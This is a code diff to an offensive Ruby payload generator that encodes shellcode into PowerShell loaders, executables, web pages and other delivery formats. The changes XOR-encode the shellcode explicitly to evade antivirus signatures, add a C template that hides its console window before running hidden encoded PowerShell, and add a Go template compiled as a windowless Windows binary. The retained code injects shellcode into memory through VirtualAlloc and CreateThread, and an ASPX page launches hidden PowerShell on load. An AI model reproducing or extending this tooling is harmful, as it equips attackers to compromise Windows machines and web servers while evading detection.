@@ -15,6 +15,7 @@
 # => vbs (for use with vbs scripts)
 # => war (tomcat)
 # => exe (executable) requires MinGW - x86_64-w64-mingw32-gcc [apt-get install mingw-w64]
+# => go (golang executable) requires Golang - go [apt-get install golang-go]
 # => java (for use with malicious java applets)
 # => js (javascript)
 # => js-rd32 (javascript called by rundll32.exe)
@@ -27,8 +28,8 @@
 #
 #    Powershell code based on PowerSploit written by Matthew Graeber and SET by Dave Kennedy
 #     DETAILS:
-#	- https://rvnsec.wordpress.com/2014/09/01/ps1encode-powershell-for-days/
-#	- https://rvnsec.wordpress.com/2015/12/18/shell-party-continues/
+#   - https://rvnsec.wordpress.com/2014/09/01/ps1encode-powershell-for-days/
+#   - https://rvnsec.wordpress.com/2015/12/18/shell-party-continues/
 #
 
 require 'optparse'
@@ -65,7 +66,7 @@ optparse = OptionParser.new do|opts|
                 options[:PAYLOAD] = a
         end
 
-    opts.on('-t', '--ENCODE VALUE', "Output format: raw, cmd, vba, vbs, war, exe, java, js, js-rd32, php, hta, cfm, aspx, lnk, sct") do |t|
+    opts.on('-t', '--ENCODE VALUE', "Output format: raw, cmd, vba, vbs, war, exe, go, java, js, js-rd32, php, hta, cfm, aspx, lnk, sct") do |t|
                 options[:ENCODE] = t
         end
     opts.separator ""
@@ -119,15 +120,27 @@ def gen_PS_shellcode()
     #powershell script to be executed pre-encode
     #finstring = "$1 = '$c = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = #{resultsS};$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";$cmd = \"-nop -noni -enc \";iex \"& $x86 $cmd $gq\"}else{$cmd = \"-nop -noni -enc\";iex \"& powershell $cmd $gq\";}"
 
-    #convert array of shellcode to byte stream, then base64 pa
-    byteZ = results.pack('C*')
-    byteZZ = Base64.encode64(byteZ).gsub(/\n/, '')
+    #convert array of shellcode to byte stream, then base64
+    #byteZ = results.pack('C*')
+    #byteZZ = Base64.encode64(byteZ).gsub(/\n/, '')
+
+    #XOR the shellcode to get around static AV signature
+    #each byte XOR with 0xff
+    resultsEnc = []
+    results.each_with_index do |val,index|
+        resultsEnc[index] = val ^ 0xff
+    end
+    
+    #build a string from the byte values
+    finS = resultsEnc.pack('c*').force_encoding('UTF-8')
+    byteZZ = Base64.encode64(finS).gsub(/\n/, '')
+
 
     templateX = %{function dw0 {
         Param ($hpP, $xnSTF)        
-        $e0Nr = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+        $e0Nr = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split("\\\\")[-1].Equals("System.dll") }).GetType("Microsoft.Win32.UnsafeNativeMethods")
         
-        return $e0Nr.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($e0Nr.GetMethod('GetModuleHandle')).Invoke($null, @($hpP)))), $xnSTF))
+        return $e0Nr.GetMethod("GetProcAddress", [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($e0Nr.GetMethod("GetModuleHandle")).Invoke($null, @($hpP)))), $xnSTF))
     }
 
     function of {
@@ -136,17 +149,21 @@ def gen_PS_shellcode()
             [Parameter(Position = 1)] [Type] $wo = [Void]
         )
         
-        $pBL = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
-        $pBL.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $doW).SetImplementationFlags('Runtime, Managed')
-        $pBL.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $wo, $doW).SetImplementationFlags('Runtime, Managed')
+        $pBL = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("ReflectedDelegate")), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule("InMemoryModule", $false).DefineType("MyDelegateType", "Class, Public, Sealed, AnsiClass, AutoClass", [System.MulticastDelegate])
+        $pBL.DefineConstructor("RTSpecialName, HideBySig, Public", [System.Reflection.CallingConventions]::Standard, $doW).SetImplementationFlags("Runtime, Managed")
+        $pBL.DefineMethod("Invoke", "Public, HideBySig, NewSlot, Virtual", $wo, $doW).SetImplementationFlags("Runtime, Managed")
         
         return $pBL.CreateType()
     }
 
     [Byte[]]$es = [System.Convert]::FromBase64String("#{byteZZ}")
+    $e = $es;
+    for($i=0; $i -lt $e.count; $i++) {$e[$i] = $e[$i] -bxor 0xff};
+
+
             
-    $jpSe_ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dw0 kernel32.dll VirtualAlloc), (of @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $es.Length,0x3000, 0x40)
-    [System.Runtime.InteropServices.Marshal]::Copy($es, 0, $jpSe_, $es.length)
+    $jpSe_ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dw0 kernel32.dll VirtualAlloc), (of @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $e.Length,0x3000, 0x40)
+    [System.Runtime.InteropServices.Marshal]::Copy($e, 0, $jpSe_, $e.length)
 
     $le2_ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dw0 kernel32.dll CreateThread), (of @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$jpSe_,[IntPtr]::Zero,0,[IntPtr]::Zero)
     [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((dw0 kernel32.dll WaitForSingleObject), (of @([IntPtr], [Int32]))).Invoke($le2_,0xffffffff) | Out-Null
@@ -163,6 +180,7 @@ def gen_PS_shellcode()
     resp = Base64.encode64(eee).gsub(/\n/, '')
 
     templateX1 = "if([IntPtr]::Size -eq 4){$b=$env:windir+'\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe'}else{$b='powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(''#{resp}''))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
+
 
     #convert to UTF-16 (powershell interprets base64 of UTF-16)
     ec = Encoding::Converter.new("UTF-8", "UTF-16LE")
@@ -339,15 +357,38 @@ end
 
     powershell_encoded = gen_PS_shellcode()
 
+#exeTEMPLATE = %{#include <stdio.h>
+##include <stdlib.h>
+
+#int main()
+#\{
+#    system("powershell -nop -win Hidden -noni -enc #{powershell_encoded}");
+#    return 0;
+#\}
+#
+#}
 exeTEMPLATE = %{#include <stdio.h>
-#include <stdlib.h>
+#include <windows.h>
 
-int main()
-\{
-    system("powershell -nop -win Hidden -noni -enc #{powershell_encoded}");
+int shellCode() {
+    system("color 63");
+    system("powershell.exe -nop -win Hidden -noni -enc #{powershell_encoded}"); 
+    /*
+        ((Shell Code into the console))
+    */
     return 0;
-\}
-
+}
+void hide(){
+    HWND stealth;
+    AllocConsole();
+    stealth = FindWindowA("ConsoleWindowClass",NULL);
+    ShowWindow (stealth,0);
+}
+int main(){
+    hide();
+    shellCode();
+    return 0;
+}
 }
 
 #write out to a new file
@@ -366,6 +407,55 @@ end
 system("rm c_file_temp.c")
 
 puts "final_.exe created!"
+
+end
+
+
+########################GO_LANG_ENCODE###############################
+if $lencode == "go"
+
+#determine if Golang has been installed
+golang = false
+golang = true if File::exists?('/usr/bin/go')
+if golang == false
+    puts "Must have Go installed in order to compile EXEs!!"
+    puts "\n\tRun to download: apt install golang-go \n"
+    exit 1
+end
+
+powershell_encoded = gen_PS_shellcode()
+
+goTEMPLATE = %{package main
+import(
+    "fmt"
+    "os/exec"
+)
+func main(){
+    c := exec.Command("powershell", "-nop" ,"-win", "Hidden", "-noni", "-enc" , "#{powershell_encoded}")
+ 
+if err := c.Run(); err != nil {
+    fmt.Println("Error: ", err)
+    }
+} 
+}
+
+#write out to a new file
+go_file_temp = File.new("go_file_temp.go", "w")
+go_file_temp.write(goTEMPLATE)
+go_file_temp.close
+   
+#compiling will require Golang installed - "apt install golang-go"
+puts "compiling..."
+
+if $exe_arch == "32"
+    system("env GOOS=windows GOARCH=386 go build -ldflags -H=windowsgui go_file_temp.go")
+else 
+    system("env GOOS=windows GOARCH=amd64 go build -ldflags -H=windowsgui go_file_temp.go")
+end
+system("rm go_file_temp.go")
+system("mv go_file_temp.exe final_go.exe")
+
+puts "final_go.exe created!"
 
 end
 
@@ -506,12 +596,12 @@ aspxTEMPLATE = %{
 <%@ Page Language="C#" AutoEventWireup="true" %>
 <%@ Import Namespace="System.Diagnostics" %>
 <script runat="server">
-	private void Page_Load(object sender, System.EventArgs e){
-		System.Diagnostics.Process process = new System.Diagnostics.Process();
-		process.StartInfo.FileName = "powershell.exe";
-		process.StartInfo.Arguments = " -nop -win Hidden -noni -enc #{powershell_encoded}";
-		process.Start();
-	}
+    private void Page_Load(object sender, System.EventArgs e){
+        System.Diagnostics.Process process = new System.Diagnostics.Process();
+        process.StartInfo.FileName = "powershell.exe";
+        process.StartInfo.Arguments = " -nop -win Hidden -noni -enc #{powershell_encoded}";
+        process.Start();
+    }
 </script>
 }
 
